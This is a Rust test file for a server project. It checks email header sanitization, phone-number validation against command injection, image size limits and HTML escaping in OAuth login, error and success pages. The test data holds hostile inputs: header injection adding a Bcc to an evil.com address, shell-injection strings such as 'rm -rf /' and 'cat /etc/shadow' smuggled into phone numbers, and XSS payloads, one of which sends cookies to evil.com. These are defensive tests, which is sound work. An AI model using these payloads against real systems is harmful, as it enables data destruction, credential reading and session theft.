mod common;
use bspds::notifications::{
    SendError, is_valid_phone_number, sanitize_header_value,
};
use bspds::oauth::templates::{login_page, error_page, success_page};
use bspds::image::{ImageProcessor, ImageError};

#[test]
fn test_sanitize_header_value_removes_crlf() {
    let malicious = "Injected\r\nBcc: attacker@evil.com";
    let sanitized = sanitize_header_value(malicious);
    assert!(!sanitized.contains('\r'), "CR should be removed");
    assert!(!sanitized.contains('\n'), "LF should be removed");
    assert!(sanitized.contains("Injected"), "Original content should be preserved");
    assert!(sanitized.contains("Bcc:"), "Text after newline should be on same line (no header injection)");
}

#[test]
fn test_sanitize_header_value_preserves_content() {
    let normal = "Normal Subject Line";
    let sanitized = sanitize_header_value(normal);
    assert_eq!(sanitized, "Normal Subject Line");
}

#[test]
fn test_sanitize_header_value_trims_whitespace() {
    let padded = "  Subject  ";
    let sanitized = sanitize_header_value(padded);
    assert_eq!(sanitized, "Subject");
}

#[test]
fn test_sanitize_header_value_handles_multiple_newlines() {
    let input = "Line1\r\nLine2\nLine3\rLine4";
    let sanitized = sanitize_header_value(input);
    assert!(!sanitized.contains('\r'), "CR should be removed");
    assert!(!sanitized.contains('\n'), "LF should be removed");
    assert!(sanitized.contains("Line1"), "Content before newlines preserved");
    assert!(sanitized.contains("Line4"), "Content after newlines preserved");
}

#[test]
fn test_email_header_injection_sanitization() {
    let header_injection = "Normal Subject\r\nBcc: attacker@evil.com\r\nX-Injected: value";
    let sanitized = sanitize_header_value(header_injection);
    let lines: Vec<&str> = sanitized.split("\r\n").collect();
    assert_eq!(lines.len(), 1, "Should be a single line after sanitization");
    assert!(sanitized.contains("Normal Subject"), "Original content preserved");
    assert!(sanitized.contains("Bcc:"), "Content after CRLF preserved as same line text");
    assert!(sanitized.contains("X-Injected:"), "All content on same line");
}

#[test]
fn test_valid_phone_number_accepts_correct_format() {
    assert!(is_valid_phone_number("+1234567890"));
    assert!(is_valid_phone_number("+12025551234"));
    assert!(is_valid_phone_number("+442071234567"));
    assert!(is_valid_phone_number("+4915123456789"));
    assert!(is_valid_phone_number("+1"));
}

#[test]
fn test_valid_phone_number_rejects_missing_plus() {
    assert!(!is_valid_phone_number("1234567890"));
    assert!(!is_valid_phone_number("12025551234"));
}

#[test]
fn test_valid_phone_number_rejects_empty() {
    assert!(!is_valid_phone_number(""));
}

#[test]
fn test_valid_phone_number_rejects_just_plus() {
    assert!(!is_valid_phone_number("+"));
}

#[test]
fn test_valid_phone_number_rejects_too_long() {
    assert!(!is_valid_phone_number("+12345678901234567890123"));
}

#[test]
fn test_valid_phone_number_rejects_letters() {
    assert!(!is_valid_phone_number("+abc123"));
    assert!(!is_valid_phone_number("+1234abc"));
    assert!(!is_valid_phone_number("+a"));
}

#[test]
fn test_valid_phone_number_rejects_spaces() {
    assert!(!is_valid_phone_number("+1234 5678"));
    assert!(!is_valid_phone_number("+ 1234567890"));
    assert!(!is_valid_phone_number("+1 "));
}

#[test]
fn test_valid_phone_number_rejects_special_chars() {
    assert!(!is_valid_phone_number("+123-456-7890"));
    assert!(!is_valid_phone_number("+1(234)567890"));
    assert!(!is_valid_phone_number("+1.234.567.890"));
}

#[test]
fn test_signal_recipient_command_injection_blocked() {
    let malicious_inputs = vec![
        "+123; rm -rf /",
        "+123 && cat /etc/passwd",
        "+123`id`",
        "+123$(whoami)",
        "+123|cat /etc/shadow",
        "+123\n--help",
        "+123\r\n--version",
        "+123--help",
    ];
    for input in malicious_inputs {
        assert!(!is_valid_phone_number(input), "Malicious input '{}' should be rejected", input);
    }
}

#[test]
fn test_image_file_size_limit_enforced() {
    let processor = ImageProcessor::new();
    let oversized_data: Vec<u8> = vec![0u8; 11 * 1024 * 1024];
    let result = processor.process(&oversized_data, "image/jpeg");
    match result {
        Err(ImageError::FileTooLarge { .. }) => {}
        Err(other) => {
            let msg = format!("{:?}", other);
            if !msg.to_lowercase().contains("size") && !msg.to_lowercase().contains("large") {
                panic!("Expected FileTooLarge error, got: {:?}", other);
            }
        }
        Ok(_) => panic!("Should reject files over size limit"),
    }
}

#[test]
fn test_image_file_size_limit_configurable() {
    let processor = ImageProcessor::new().with_max_file_size(1024);
    let data: Vec<u8> = vec![0u8; 2048];
    let result = processor.process(&data, "image/jpeg");
    assert!(result.is_err(), "Should reject files over configured limit");
}

#[test]
fn test_oauth_template_xss_escaping_client_id() {
    let malicious_client_id = "<script>alert('xss')</script>";
    let html = login_page(malicious_client_id, None, None, "test-uri", None, None);
    assert!(!html.contains("<script>"), "Script tags should be escaped");
    assert!(html.contains("&lt;script&gt;"), "HTML entities should be used for escaping");
}

#[test]
fn test_oauth_template_xss_escaping_client_name() {
    let malicious_client_name = "<img src=x onerror=alert('xss')>";
    let html = login_page("client123", Some(malicious_client_name), None, "test-uri", None, None);
    assert!(!html.contains("<img "), "IMG tags should be escaped");
    assert!(html.contains("&lt;img"), "IMG tag should be escaped as HTML entity");
}

#[test]
fn test_oauth_template_xss_escaping_scope() {
    let malicious_scope = "\"><script>alert('xss')</script>";
    let html = login_page("client123", None, Some(malicious_scope), "test-uri", None, None);
    assert!(!html.contains("<script>"), "Script tags in scope should be escaped");
}

#[test]
fn test_oauth_template_xss_escaping_error_message() {
    let malicious_error = "<script>document.location='http://evil.com?c='+document.cookie</script>";
    let html = login_page("client123", None, None, "test-uri", Some(malicious_error), None);
    assert!(!html.contains("<script>"), "Script tags in error should be escaped");
}

#[test]
fn test_oauth_template_xss_escaping_login_hint() {
    let malicious_hint = "\" onfocus=\"alert('xss')\" autofocus=\"";
    let html = login_page("client123", None, None, "test-uri", None, Some(malicious_hint));
    assert!(!html.contains("onfocus=\"alert"), "Event handlers should be escaped in login hint");
    assert!(html.contains("&quot;"), "Quotes should be escaped");
}

#[test]
fn test_oauth_template_xss_escaping_request_uri() {
    let malicious_uri = "\" onmouseover=\"alert('xss')\"";
    let html = login_page("client123", None, None, malicious_uri, None, None);
    assert!(!html.contains("onmouseover=\"alert"), "Event handlers should be escaped in request_uri");
}

#[test]
fn test_oauth_error_page_xss_escaping() {
    let malicious_error = "<script>steal()</script>";
    let malicious_desc = "<img src=x onerror=evil()>";
    let html = error_page(malicious_error, Some(malicious_desc));
    assert!(!html.contains("<script>"), "Script tags should be escaped in error page");
    assert!(!html.contains("<img "), "IMG tags should be escaped in error page");
}

#[test]
fn test_oauth_success_page_xss_escaping() {
    let malicious_name = "<script>steal_session()</script>";
    let html = success_page(Some(malicious_name));
    assert!(!html.contains("<script>"), "Script tags should be escaped in success page");
}

#[test]
fn test_oauth_template_no_javascript_urls() {
    let html = login_page("client123", None, None, "test-uri", None, None);
    assert!(!html.contains("javascript:"), "Login page should not contain javascript: URLs");
    let error_html = error_page("test_error", None);
    assert!(!error_html.contains("javascript:"), "Error page should not contain javascript: URLs");
    let success_html = success_page(None);
    assert!(!success_html.contains("javascript:"), "Success page should not contain javascript: URLs");
}

#[test]
fn test_oauth_template_form_action_safe() {
    let malicious_uri = "javascript:alert('xss')//";
    let html = login_page("client123", None, None, malicious_uri, None, None);
    assert!(html.contains("action=\"/oauth/authorize\""), "Form action should be fixed URL");
}

#[test]
fn test_send_error_types_have_display() {
    let timeout = SendError::Timeout;
    let max_retries = SendError::MaxRetriesExceeded("test".to_string());
    let invalid_recipient = SendError::InvalidRecipient("bad recipient".to_string());
    assert!(!format!("{}", timeout).is_empty());
    assert!(!format!("{}", max_retries).is_empty());
    assert!(!format!("{}", invalid_recipient).is_empty());
}

#[test]
fn test_send_error_timeout_message() {
    let error = SendError::Timeout;
    let msg = format!("{}", error);
    assert!(msg.to_lowercase().contains("timeout"), "Timeout error should mention timeout");
}

#[test]
fn test_send_error_max_retries_includes_detail() {
    let error = SendError::MaxRetriesExceeded("Server returned 503".to_string());
    let msg = format!("{}", error);
    assert!(msg.contains("503") || msg.contains("retries"), "MaxRetriesExceeded should include context");
}

#[tokio::test]
async fn test_check_signup_queue_accepts_session_jwt() {
    use common::{base_url, client, create_account_and_login};
    let base = base_url().await;
    let http_client = client();
    let (token, _did) = create_account_and_login(&http_client).await;
    let res = http_client
        .get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), reqwest::StatusCode::OK, "Session JWTs should be accepted");
    let body: serde_json::Value = res.json().await.unwrap();
    assert_eq!(body["activated"], true);
}

#[tokio::test]
async fn test_check_signup_queue_no_auth() {
    use common::{base_url, client};
    let base = base_url().await;
    let http_client = client();
    let res = http_client
        .get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), reqwest::StatusCode::OK, "No auth should work");
    let body: serde_json::Value = res.json().await.unwrap();
    assert_eq!(body["activated"], true);
}

#[test]
fn test_html_escape_ampersand() {
    let html = login_page("client&test", None, None, "test-uri", None, None);
    assert!(html.contains("&amp;"), "Ampersand should be escaped");
    assert!(!html.contains("client&test"), "Raw ampersand should not appear in output");
}

#[test]
fn test_html_escape_quotes() {
    let html = login_page("client\"test'more", None, None, "test-uri", None, None);
    assert!(html.contains("&quot;") || html.contains("&#34;"), "Double quotes should be escaped");
    assert!(html.contains("&#39;") || html.contains("&apos;"), "Single quotes should be escaped");
}

#[test]
fn test_html_escape_angle_brackets() {
    let html = login_page("client<test>more", None, None, "test-uri", None, None);
    assert!(html.contains("&lt;"), "Less than should be escaped");
    assert!(html.contains("&gt;"), "Greater than should be escaped");
    assert!(!html.contains("<test>"), "Raw angle brackets should not appear");
}

#[test]
fn test_oauth_template_preserves_safe_content() {
    let html = login_page("my-safe-client", Some("My Safe App"), Some("read write"), "valid-uri", None, Some("user@example.com"));
    assert!(html.contains("my-safe-client") || html.contains("My Safe App"), "Safe content should be preserved");
    assert!(html.contains("read write") || html.contains("read"), "Scope should be preserved");
    assert!(html.contains("user@example.com"), "Login hint should be preserved");
}

#[test]
fn test_csrf_like_input_value_protection() {
    let malicious = "\" onclick=\"alert('csrf')";
    let html = login_page("client", None, None, malicious, None, None);
    assert!(!html.contains("onclick=\"alert"), "Event handlers should not be executable");
}

#[test]
fn test_unicode_handling_in_templates() {
    let unicode_client = "客户端 クライアント";
    let html = login_page(unicode_client, None, None, "test-uri", None, None);
    assert!(html.contains("客户端") || html.contains("&#"), "Unicode should be preserved or encoded");
}

#[test]
fn test_null_byte_in_input() {
    let with_null = "client\0id";
    let sanitized = sanitize_header_value(with_null);
    assert!(sanitized.contains("client"), "Content before null should be preserved");
}

#[test]
fn test_very_long_input_handling() {
    let long_input = "x".repeat(10000);
    let sanitized = sanitize_header_value(&long_input);
    assert!(!sanitized.is_empty(), "Long input should still produce output");
}
